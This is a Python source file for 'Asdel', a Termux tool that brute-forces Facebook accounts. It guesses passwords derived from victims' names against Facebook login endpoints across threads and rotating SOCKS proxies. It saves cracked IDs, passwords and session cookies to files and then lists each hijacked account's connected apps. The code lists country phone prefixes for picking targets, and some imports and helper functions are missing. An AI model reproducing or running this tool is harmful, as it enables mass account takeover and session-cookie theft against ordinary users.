#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen2, ugen = [],[],[]
loop, ok, cp = 0,0,0
###----------[ GLOBAL NAMA ]----------###
url = "m.prod.facebook.com"
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
usragent = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ugen=[]
ugen2=[]
## RANDOM UA
#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
#------------[ INDICATION ]---------------#)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
###----------[ PEH ]----------###
P2 = '\033[1;31m'
H2 = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, O, N]
###----------[ CONVERT LINE ]----------###
led = f'{P}-----------------------------------------------------'
dt= f" {K}Don't minimize termux during cloning\n{P}-----------------------------------------------------"

###----------[ BANNER MENUH ]----------###
fst=f' kawsar > akash > kaung > biraj > jackson'
lst=f' ahmed > ali > islam > myat > thapa > jeneral'
limitt=f' Example -> 2000 > 4000 > 8000 > 20000'
fast=f' BD -> 01703 > 01881 > 01927 > 01636 > 01368\n NP -> 984576 > 974523 > 986508 > 984117 > 986023\n PK -> 030671 > 031592 > 033585 > 034536\n IN -> +91637792 > +91630438 > +91955178\n ID -> +6282269 > +6285359 > +6283105'
medium=f' BD -> 0170 > 0188 > 0192 > 0163 > 0136\n NP -> 98451 > 97458 > 98657 > 98412 > 98604\n PK -> 03062 > 03157 > 03358 > 03454\n ID -> +628226 > +628535 > +628310\n IN -> +9163797 > +9163074 > +9195516'
slow=f' BD -> 017 > 018 > 019 > 016 > 013 > 014\n NP -> 9845 > 9745 > 9865 > 9841 > 9860\n PK -> 0306 > 0315 > 0335 > 0345\n ID -> +62822 > +62853 > +62831\n IN -> +916377 > +916304 > +919551'
mtd,cp_xdx,cokix=[],[],[]
def clear():
 os.system('clear')
#---------------------[Banner]---------------------#
def Asdel():
    #os.system('clear')
    print(f"""\x1b[1;97m

 🇦​​​​​🇸​​​​​🇩​​​​​🇪​​​​​🇱​​​​​version\033[0;0m\x1b[1;30m 1.2 \x1b[1;30m
\033[38;3;276;131;0;1m------------------------------------------------
 Author   : ZOUHAI®
 Tools    : \x1b[38;5;208mAsdel\x1b[1;97m
 Status   : personnel
------------------------------------------------""")
#---------------------[Main-Menu]---------------------#
def rmain():
    print(" [1] crack from File")
    print(" [2] crack from email")
    print(" [0] exit program");print(led)
    xytee = input(f' Select Option : ')
    if xytee in ["1","01"]:
        file()
    elif xytee in ["2","02"]:
         rdm()
         mail()
         print('Wait it will launch very soon')
    elif xytee in ["0","00"]:
     print(f' Exited Asdel Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61554748685443");time.sleep(3);os.system('xdg-open https://www.facebook.com/alphaxd.69');exit()
    else:
     print(f" Don't Select Wrong Options ");os.system("xdg-open https://t.me/Asdeltools");rmain()

#---------------------[File-Menu]---------------------#
def file():
	os.system('clear')
	Asdel();print(' \033[1;37mExample \033[1;31m: \033[1;32m/sdcard/Asdel.py');print(led)
	o = input(' Put file path\033[1;31m :\x1b[1;90m ')
	print('\x1b[1;97m')
	try:lin = open(o).read().splitlines()
	except:
		print(' Wrong file given')
		time.sleep
		file()
	for xid in lin:
		id.append(xid)
	setting()
#---------------------[File-Setting]---------------------#
def setting():
    clear();Asdel();print(f' [1] New Ids Crack ');print(f' [2] Old Ids Crack');print(f' [3] Mix Ids Crack');print(led)
    hu = input(f' Select Option {M}:{A} ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('Wrong try again');exit();print('')
    print(led)
    xd_cp=input(f' Cloning Show cp Account ? y/n {M}:{A} ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
    else:cp_xdx.append('n')
    print(led)
    cokixx=input(f' Cloning Show Cookie ? y/n {M}:{A} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    clear();Asdel();print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
    hc = input(f' Select Method {M}:{A} ')
    if hc in ['1','01']:method.append('md1')
    elif hc in ['2','02']:method.append('md2')
    elif hc in ['3','03']:method.append('md3')
    else:method.append('md1')
    clear();p4()
#---------------------[File-Method]---------------------#
def p4():
    os.system("clear");Asdel();print(dt);print(f' Total Dump File -> {H}'+str(len(id)));print(f' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(nmf+'1234')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'123456');pwv.append(frs+'12345')

            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'md1' in method:pool.submit(md1,idf,pwv)
            elif 'md2' in method:pool.submit(md2,idf,pwv)
            elif 'md3' in method:pool.submit(md3,idf,pwv)
            else:pool.submit(md1,idf,pwv)
    print(f' Crack process has been Successful');rmain()
#---------------------[Method-1]---------------------#
def md1(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Asdel-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(ugen)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade= {
      "Host": "m.facebook.com",
      "content-length": f"{len(str(dataa))}",
      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
      "origin": "https://m.facebook.com",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
      "accept": "*/*",
      "x-requested-with": "Linux",
      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
      "sec-ch-ua-platform": '"Android"',
      "sec-ch-ua-mobile": "?1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-fetch-user": "?0",
      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
      "accept-encoding": "gzip, deflate br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{B} Cookies {M}: {P}'+kuki)
        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(33)
  loop+=1
#---------------------[Method-2]---------------------#
def md2(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Asdel-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
  sys.stdout.flush()
  ua = random.choice(ugen)
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
      p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
      po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{B} Cookies {M}: {P}'+kuki)
        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(33)
  loop+=1
#---------------------[Method-3]---------------------#
def md3(idf,pwv):
  global loop,ok,cp
  sys.stdout.write(f'\r{P} [Asdel-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
  ua, ua2 = Ugen(),Ugen2()
  ses = requests.Session()
  for pw in pwv:
    try:
      nip=random.choice(proxsi)
      proxs= {'http': 'socks4://'+nip}
      ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
      p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
      dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
      po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r\x1b[38;5;208m [Asdel-Cp] \x1b[38;5;208m{idf}|{pw}{xxx}')
        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki=po.cookies.get_dict()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        idf = re.findall('c_user=(.*);xs', kuki)[0]
        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
        if 'y' in cokix:
         print(f'\r{P} Cookies {M}:{P} '+kuki)
        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      waktu(31)
  loop+=1
#---------------------[Apk]---------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	rmain()
